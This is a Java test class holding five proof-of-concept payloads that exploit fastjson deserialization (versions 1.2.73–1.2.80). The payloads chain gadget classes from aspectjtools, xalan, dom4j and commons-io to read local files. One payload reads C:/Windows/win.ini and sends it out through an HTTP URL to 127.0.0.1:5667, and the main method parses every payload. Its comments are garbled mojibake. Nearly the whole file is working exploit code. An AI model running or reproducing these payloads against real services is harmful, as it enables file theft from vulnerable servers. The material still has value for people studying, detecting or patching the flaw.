package test;

import com.alibaba.fastjson.JSON;

public class Fastjson21_ajt_xalan_dom4j_io_read_httplog {
    public static void main(String[] args){
    	
        //ÒÀÀµ1.2.73-1.2.80£¬ÒÀÀµaspectjtools  xalan-2.7.2 dom4j-2.1.3  commons-io-2.2
    	String poc1 = "[{\r\n"
    			+ "		\"@type\": \"java.lang.Exception\",\r\n"
    			+ "		\"@type\": \"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException\"\r\n"
    			+ "	},\r\n"
    			+ "	{\r\n"
    			+ "		\"@type\": \"java.lang.Class\",\r\n"
    			+ "		\"val\": {\r\n"
    			+ "			\"@type\": \"java.lang.String\" {\r\n"
    			+ "				\"@type\": \"java.util.Locale\",\r\n"
    			+ "				\"val\": {\r\n"
    			+ "					\"@type\": \"com.alibaba.fastjson.JSONObject\",\r\n"
    			+ "					{\r\n"
    			+ "						\"@type\": \"java.lang.String\"\r\n"
    			+ "						\"@type\": \"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException\",\r\n"
    			+ "						\"newAnnotationProcessorUnits\": [{}]\r\n"
    			+ "					}\r\n"
    			+ "				}\r\n"
    			+ "			},\r\n"
    			+ "			{\r\n"
    			+ "				\"x\": {\r\n"
    			+ "					\"@type\": \"org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit\",\r\n"
    			+ "					\"@type\": \"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit\",\r\n"
    			+ "					\"fileName\": \"aaa\"\r\n"
    			+ "				}\r\n"
    			+ "			}]";
        String poc2 = "{\r\n"
        		+ "		\"@type\": \"java.lang.Exception\",\r\n"
        		+ "		\"@type\": \"org.apache.xml.dtm.DTMConfigurationException\",\"locator\":{}\r\n"
        		+ "}";
        String poc3 = "{\r\n"
        		+ "		\"@type\": \"java.lang.Class\",\r\n"
        		+ "		\"val\": {\r\n"
        		+ "			\"@type\": \"java.lang.String\" {\r\n"
        		+ "				\"@type\": \"java.util.Locale\",\r\n"
        		+ "				\"val\": {\r\n"
        		+ "					\"@type\": \"com.alibaba.fastjson.JSONObject\",\r\n"
        		+ "					{\r\n"
        		+ "						\"@type\": \"java.lang.String\"\r\n"
        		+ "						\"@type\": \"org.apache.xml.dtm.DTMConfigurationException\",\r\n"
        		+ "						\"locator\": {}\r\n"
        		+ "					}\r\n"
        		+ "				}\r\n"
        		+ "			}";
        String poc4 = "{\r\n"
        		+ "	\"su14\": {\r\n"
        		+ "		\"@type\": \"javax.xml.transform.SourceLocator\",\r\n"
        		+ "		\"@type\": \"org.apache.xpath.objects.XNodeSetForDOM\",\r\n"
        		+ "		\"nodeIter\": {\r\n"
        		+ "			\"@type\": \"org.apache.xpath.NodeSet\"\r\n"
        		+ "		},\r\n"
        		+ "		\"xctxt\": {\r\n"
        		+ "			\"@type\": \"org.apache.xpath.XPathContext\",\r\n"
        		+ "			\"primaryReader\": {\r\n"
        		+ "				\"@type\": \"org.dom4j.io.XMLWriter\",\r\n"
        		+ "				\"entityResolver\": {\r\n"
        		+ "					\"@type\": \"org.dom4j.io.SAXContentHandler\",\r\n"
        		+ "					\"inputSource\": {\r\n"
        		+ "						\"byteStream\": {\r\n"
        		+ "							\"@type\": \"java.io.InputStream\"\r\n"
        		+ "						}\r\n"
        		+ "					}\r\n"
        		+ "				}\r\n"
        		+ "			}\r\n"
        		+ "		}\r\n"
        		+ "	}\r\n"
        		+ "}";
    	//http´ø³ö
        String poc5  = "{\r\n"
    			+ "                        \"@type\": \"java.io.InputStream\",\r\n"
    			+ "						\"@type\": \"org.apache.commons.io.input.BOMInputStream\",\r\n"
    			+ "						\"delegate\": {\r\n"
    			+ "							\"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\r\n"
    			+ "							\"reader\": {\r\n"
    			+ "								\"@type\": \"jdk.nashorn.api.scripting.URLReader\",\r\n"
    			+ "								\"url\": {\r\n"
    			+ "									\"@type\": \"java.lang.String\" {\r\n"
    			+ "										\"@type\": \"java.util.Locale\",\r\n"
    			+ "										\"val\": {\r\n"
    			+ "											\"@type\": \"com.alibaba.fastjson.JSONObject\",\r\n"
    			+ "											{\r\n"
    			+ "												\"@type\": \"java.lang.String\"\r\n"
    			+ "												\"@type\": \"java.util.Locale\",\r\n"
    			+ "												\"language\": \"http://127.0.0.1:5667/?test\",\r\n"
    			+ "												\"country\": {\r\n"
    			+ "													\"@type\": \"java.lang.String\" [{\r\n"
    			+ "														\"@type\": \"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit\",\r\n"
    			+ "														\"fileName\": \"C:/Windows/win.ini\"\r\n"
    			+ "													}]\r\n"
    			+ "\r\n"
    			+ "												}\r\n"
    			+ "											}\r\n"
    			+ "										},\r\n"
    			+ "										\"charsetName\": \"UTF-8\",\r\n"
    			+ "										\"bufferSize\": 1024\r\n"
    			+ "									},\r\n"
    			+ "									\"boms\": [{\r\n"
    			+ "										\"@type\": \"org.apache.commons.io.ByteOrderMark\",\r\n"
    			+ "										\"charsetName\": \"UTF-8\",\r\n"
    			+ "										\"bytes\": [\r\n"
    			+ "											36\r\n"
    			+ "										]\r\n"
    			+ "									}]\r\n"
    			+ "								}";
    	
    	System.out.println(poc1);
    	System.out.println(poc2);
        try {
            JSON.parseObject(poc1);
        } catch (Exception e){}
        try {
            JSON.parseObject(poc2);
        } catch (Exception e){}
        
        JSON.parseObject(poc3);
        JSON.parseObject(poc4);
        JSON.parseObject(poc5);

        

    }
}
